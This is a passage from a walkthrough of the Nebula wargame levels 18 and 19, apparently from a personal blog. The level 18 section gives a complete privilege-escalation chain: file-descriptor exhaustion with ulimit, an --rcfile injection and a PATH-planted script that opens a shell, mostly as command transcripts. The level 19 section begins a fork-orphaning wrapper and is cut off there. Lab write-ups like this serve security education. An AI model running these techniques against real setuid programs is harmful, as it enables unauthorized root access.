</span><span class='line'>              <span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">optarg</span><span class="p">,</span> <span class="s">&quot;w+&quot;</span><span class="p">);</span>
</span><span class='line'>              <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Unable to open %s&quot;</span><span class="p">,</span> <span class="n">optarg</span><span class="p">);</span>
</span><span class='line'>              <span class="n">setvbuf</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>              <span class="k">break</span><span class="p">;</span>
</span><span class='line'>          <span class="k">case</span> <span class="sc">&#39;v&#39;</span>:
</span><span class='line'>              <span class="n">globals</span><span class="p">.</span><span class="n">verbose</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>              <span class="k">break</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">dprintf</span><span class="p">(</span><span class="s">&quot;Starting up. Verbose level = %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">globals</span><span class="p">.</span><span class="n">verbose</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">setresgid</span><span class="p">(</span><span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">());</span>
</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'>      <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">q</span> <span class="o">=</span> <span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">q</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span><span class='line'>      <span class="n">p</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="sc">&#39;\n&#39;</span><span class="p">);</span> <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>      <span class="n">p</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="sc">&#39;\r&#39;</span><span class="p">);</span> <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">dvprintf</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">&quot;got [%s] as input</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">line</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;login&quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">dvprintf</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">&quot;attempting to login</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>          <span class="n">login</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">6</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;logout&quot;</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;shell&quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">dvprintf</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">&quot;attempting to start shell</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>              <span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span><span class='line'>              <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;unable to execve&quot;</span><span class="p">);</span>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>          <span class="n">dprintf</span><span class="p">(</span><span class="s">&quot;Permission denied</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;logout&quot;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;closelog&quot;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">)</span> <span class="n">fclose</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">);</span>
</span><span class='line'>          <span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;site exec&quot;</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">notsupported</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">10</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;setuser&quot;</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">setuser</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Ok. Not so small then. This program took a while to work through. Initially the vulnerability was not so obvious. I could figure out that a few flags were setting a few things inside the global struct and that a password file exists. If I was able to read the password, then I could be marked as logged in and eventually get to the line that does <code>execve("/bin/sh", argv, envp);</code>.</p>

<p>I noticed the buffer overflow and format string vulnerabilities, but considering the binary was compiled with SSP, partial RELO, and a NX stack, I figured that memory corruption was not necessarily the way to complete this one.</p>

<p>Lots of toying around with the program eventually got me to realize the flaw. If for some reason the program was not able to read the password file successfully, it would just log us in. The password file is <code>/home/flag18/password</code> and we don’t have the required permissions to move it or something. I suppose that would have been too easy anyways ;p</p>

<p>So what do we have left? I had to poke around and think about conditions that could make opening a file fail. Eventually I remembered about maximum file descriptors and figured it was worth a shot. What motivated this thinking was the fact that the binary has a <code>closelog</code> command too. So, I started to play around with <code>ulimit</code>, gradually reducing <code>-n</code> until I got to the value 4 as the one that would let me log in due to the fact that the password file could no longer being able to be read; This thanks to the maximum open files limit being reached.</p>

<p>Without setting the max open files, a sample run would be:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level18@nebula:~<span class="nv">$ </span>touch /tmp/log
</span><span class='line'>level18@nebula:~<span class="nv">$ </span>tail -f /tmp/log <span class="p">&amp;</span>
</span><span class='line'><span class="o">[</span>1<span class="o">]</span> 6499
</span><span class='line'>
</span><span class='line'>level18@nebula:~<span class="nv">$ </span>~flag18/flag18 -vvv -d /tmp/log
</span><span class='line'>Starting up. Verbose <span class="nv">level</span> <span class="o">=</span> 3
</span><span class='line'>login egg
</span><span class='line'>got <span class="o">[</span>login egg<span class="o">]</span> as input
</span><span class='line'>attempting to login
</span><span class='line'>shell
</span><span class='line'>got <span class="o">[</span>shell<span class="o">]</span> as input
</span><span class='line'>attempting to start shell
</span><span class='line'>Permission denied
</span></code></pre></td></tr></table></div></figure>


<p>Dropping the max open files to 4 though, we get:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level18@nebula:~<span class="nv">$ </span><span class="nb">ulimit</span> -n 4
</span><span class='line'>
</span><span class='line'>level18@nebula:~<span class="nv">$ </span>~flag18/flag18 -vvv -d /tmp/log
</span><span class='line'>-sh: start_pipeline: pgrp pipe: Too many open files
</span><span class='line'>tail: /tmp/log: file truncated
</span><span class='line'>Starting up. Verbose <span class="nv">level</span> <span class="o">=</span> 3
</span><span class='line'>login egg
</span><span class='line'>got <span class="o">[</span>login egg<span class="o">]</span> as input
</span><span class='line'>attempting to login
</span><span class='line'>logged in successfully <span class="o">(</span>without password file<span class="o">)</span>
</span><span class='line'>shell
</span><span class='line'>got <span class="o">[</span>shell<span class="o">]</span> as input
</span><span class='line'>attempting to start shell
</span><span class='line'>/home/flag18/flag18: error <span class="k">while </span>loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24
</span></code></pre></td></tr></table></div></figure>


<p>Login worked :) We can also now call the shell command however the max open files thing looks like a problem. Luckily the binary had that <code>closelog</code> command that will free up a file descriptor. Rerunning the above but calling <code>closelog</code> before we call <code>shell</code> results in:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level18@nebula:~<span class="nv">$ </span>~flag18/flag18 -vvv -d /tmp/log
</span><span class='line'>-sh: start_pipeline: pgrp pipe: Too many open files
</span><span class='line'>tail: /tmp/log: file truncated
</span><span class='line'>Starting up. Verbose <span class="nv">level</span> <span class="o">=</span> 3
</span><span class='line'>login egg
</span><span class='line'>got <span class="o">[</span>login egg<span class="o">]</span> as input
</span><span class='line'>attempting to login
</span><span class='line'>logged in successfully <span class="o">(</span>without password file<span class="o">)</span>
</span><span class='line'>closelog
</span><span class='line'>got <span class="o">[</span>closelog<span class="o">]</span> as input
</span><span class='line'>shell
</span><span class='line'>/home/flag18/flag18: -d: invalid option
</span><span class='line'>Usage:  /home/flag18/flag18 <span class="o">[</span>GNU long option<span class="o">]</span> <span class="o">[</span>option<span class="o">]</span> ...
</span><span class='line'>    /home/flag18/flag18 <span class="o">[</span>GNU long option<span class="o">]</span> <span class="o">[</span>option<span class="o">]</span> script-file ...
</span><span class='line'>GNU long options:
</span><span class='line'>    --debug
</span><span class='line'>    --debugger
</span><span class='line'>    --dump-po-strings
</span><span class='line'>    --dump-strings
</span><span class='line'>    --help
</span><span class='line'>    --init-file
</span><span class='line'>    --login
</span><span class='line'>    --noediting
</span><span class='line'>    --noprofile
</span><span class='line'>    --norc
</span><span class='line'>    --posix
</span><span class='line'>    --protected
</span><span class='line'>    --rcfile
</span><span class='line'>    --restricted
</span><span class='line'>    --verbose
</span><span class='line'>    --version
</span><span class='line'>Shell options:
</span><span class='line'>    -irsD or -c <span class="nb">command </span>or -O shopt_option      <span class="o">(</span>invocation only<span class="o">)</span>
</span><span class='line'>    -abefhkmnptuvxBCHP or -o option
</span></code></pre></td></tr></table></div></figure>


<p>Examining the error we get now together with the source code, it was clear that the arguments sent to the <code>flag18</code> binary was also passed to the <code>execve()</code> call. That means that the error is actually sourced from the fact that <code>sh</code> has no <code>-d</code> flag. In fact, one could replicate this error by simply calling <code>sh -d</code>. This called for some more man page reading once again. I realized later that the error may have also been a sort of hint based on the fact that the <em>GNU long options</em> are shown. <code>--rcfile</code> seemed like a good option as it would allow me to specify a type of init script to run. I had a number of attempts to try get this into something workable. Eventually the only file I could get it to load was the logfile I was specifying when running <code>flag18</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level18@nebula:~<span class="nv">$ </span>~flag18/flag18 --rcfile -d /tmp/log -vvv
</span><span class='line'>-sh: start_pipeline: pgrp pipe: Too many open files
</span><span class='line'>/home/flag18/flag18: invalid option -- <span class="s1">&#39;-&#39;</span>
</span><span class='line'>/home/flag18/flag18: invalid option -- <span class="s1">&#39;r&#39;</span>
</span><span class='line'>/home/flag18/flag18: invalid option -- <span class="s1">&#39;c&#39;</span>
</span><span class='line'>/home/flag18/flag18: invalid option -- <span class="s1">&#39;f&#39;</span>
</span><span class='line'>/home/flag18/flag18: invalid option -- <span class="s1">&#39;i&#39;</span>
</span><span class='line'>/home/flag18/flag18: invalid option -- <span class="s1">&#39;l&#39;</span>
</span><span class='line'>/home/flag18/flag18: invalid option -- <span class="s1">&#39;e&#39;</span>
</span><span class='line'>tail: /tmp/log: file truncated
</span><span class='line'>Starting up. Verbose <span class="nv">level</span> <span class="o">=</span> 3
</span><span class='line'>login egg
</span><span class='line'>got <span class="o">[</span>login egg<span class="o">]</span> as input
</span><span class='line'>attempting to login
</span><span class='line'>logged in successfully <span class="o">(</span>without password file<span class="o">)</span>
</span><span class='line'>closelog
</span><span class='line'>got <span class="o">[</span>closelog<span class="o">]</span> as input
</span><span class='line'>shell
</span><span class='line'>/tmp/log: line 1: Starting: <span class="nb">command </span>not found
</span><span class='line'>/tmp/log: line 2: got: <span class="nb">command </span>not found
</span><span class='line'>/tmp/log: line 3: attempting: <span class="nb">command </span>not found
</span><span class='line'>/tmp/log: line 4: syntax error near unexpected token <span class="sb">`</span><span class="o">(</span><span class="s1">&#39;</span>
</span><span class='line'><span class="s1">/tmp/log: line 4: `logged in successfully (without password file)&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The line <code>Starting: command not found</code> was as close as I could get to some form of controlled command execution. So, I created this file, exported it into my <code>PATH</code> and used it to prepare a small SETUID C shell.</p>

<p>So, to solve level18:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level18@nebula:~<span class="nv">$ </span>vim /var/tmp/Starting
</span><span class='line'>level18@nebula:~<span class="nv">$ </span>chmod +x /var/tmp/Starting
</span><span class='line'>level18@nebula:~<span class="nv">$ </span>cat /var/tmp/Starting
</span><span class='line'><span class="c">#!/bin/sh</span>
</span><span class='line'>/bin/sh
</span><span class='line'>
</span><span class='line'>level18@nebula:~<span class="nv">$ </span>tail -f /tmp/log <span class="p">&amp;</span>
</span><span class='line'><span class="o">[</span>1<span class="o">]</span> 7627
</span><span class='line'>
</span><span class='line'>level18@nebula:~<span class="nv">$ </span>Starting up. Verbose <span class="nv">level</span> <span class="o">=</span> 3
</span><span class='line'>got <span class="o">[</span>login egg<span class="o">]</span> as input
</span><span class='line'>attempting to login
</span><span class='line'>logged in successfully <span class="o">(</span>without password file<span class="o">)</span>
</span><span class='line'>got <span class="o">[</span>closelog<span class="o">]</span> as input
</span><span class='line'>
</span><span class='line'>level18@nebula:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/var/tmp:<span class="nv">$PATH</span>
</span><span class='line'>level18@nebula:~<span class="nv">$ </span><span class="nb">ulimit</span> -n 4
</span><span class='line'>
</span><span class='line'>level18@nebula:~<span class="nv">$ </span>~flag18/flag18 --rcfile -d /tmp/log -vvv
</span><span class='line'>-sh: start_pipeline: pgrp pipe: Too many open files
</span><span class='line'>/home/flag18/flag18: invalid option -- <span class="s1">&#39;-&#39;</span>
</span><span class='line'>/home/flag18/flag18: invalid option -- <span class="s1">&#39;r&#39;</span>
</span><span class='line'>/home/flag18/flag18: invalid option -- <span class="s1">&#39;c&#39;</span>
</span><span class='line'>/home/flag18/flag18: invalid option -- <span class="s1">&#39;f&#39;</span>
</span><span class='line'>/home/flag18/flag18: invalid option -- <span class="s1">&#39;i&#39;</span>
</span><span class='line'>/home/flag18/flag18: invalid option -- <span class="s1">&#39;l&#39;</span>
</span><span class='line'>/home/flag18/flag18: invalid option -- <span class="s1">&#39;e&#39;</span>
</span><span class='line'>tail: /tmp/log: file truncated
</span><span class='line'>Starting up. Verbose <span class="nv">level</span> <span class="o">=</span> 3
</span><span class='line'>login egg
</span><span class='line'>got <span class="o">[</span>login egg<span class="o">]</span> as input
</span><span class='line'>attempting to login
</span><span class='line'>logged in successfully <span class="o">(</span>without password file<span class="o">)</span>
</span><span class='line'>closelog
</span><span class='line'>got <span class="o">[</span>closelog<span class="o">]</span> as input
</span><span class='line'>shell
</span><span class='line'>
</span><span class='line'>sh-4.2<span class="nv">$ </span>getflag
</span><span class='line'>sh: start_pipeline: pgrp pipe: Too many open files
</span><span class='line'>You have successfully executed getflag on a target account
</span></code></pre></td></tr></table></div></figure>


<h2>level19</h2>

<p><a href="https://exploit-exercises.com/nebula/level19/">Level19&rsquo;s Description</a>:</p>

<blockquote><p>There is a flaw in the below program in how it operates.</p></blockquote>


<p>With the description we are provided with the source code of a small C program:</p>

<figure class='code'><figcaption><span>level19.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/stat.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">pid_t</span> <span class="n">pid</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">stat</span> <span class="n">statbuf</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Get the parent&#39;s /proc entry, so we can verify its user id */</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">snprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;/proc/%d&quot;</span><span class="p">,</span> <span class="n">getppid</span><span class="p">());</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* stat() it */</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">stat</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">statbuf</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to check parent process</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* check the owner id */</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">statbuf</span><span class="p">.</span><span class="n">st_uid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="cm">/* If root started us, it is ok to start the shell */</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Unable to execve&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You are unauthorized to run this program</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This one had me completely lost. After studying the functions used, I resorted to getting a hint. Partially reading another walkthrough, I came to the section where it mentions a <code>fork()</code> operation on the <code>flag19</code> binary. Basically, what it boils down to is the fact that when the process is forked and the parent dies, PID 1 (owned by root) will become the owner causing the checks we have in this binary to fail.</p>

<p>To go about this, we would have to write a small C wrapper that will fork itself. We need to give this wrapper a few seconds after the fork to finish off allowing the forked process to become orphaned. Once the process is in the orphaned state, we can <code>execv()</code> the <code>flag19</code> binary and prepare a shell :)</p>

<p>So, to solve level19:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level19@nebula:/var/tmp<span class="nv">$ </span>vim pwn19.c
</span><span class='line'>level19@nebula:/var/tmp<span class="nv">$ </span>cat pwn19.c
</span><span class='line'><span class="c">#include&lt;stdio.h&gt;</span>
</span><span class='line'><span class="c">#include&lt;unistd.h&gt;</span>
</span><span class='line'>
</span><span class='line'>int main<span class="o">(</span>void<span class="o">)</span> <span class="o">{</span>
</span><span class='line'>
</span><span class='line'>    pid_t <span class="nv">pid</span> <span class="o">=</span> fork<span class="o">()</span><span class="p">;</span>
</span><span class='line'>
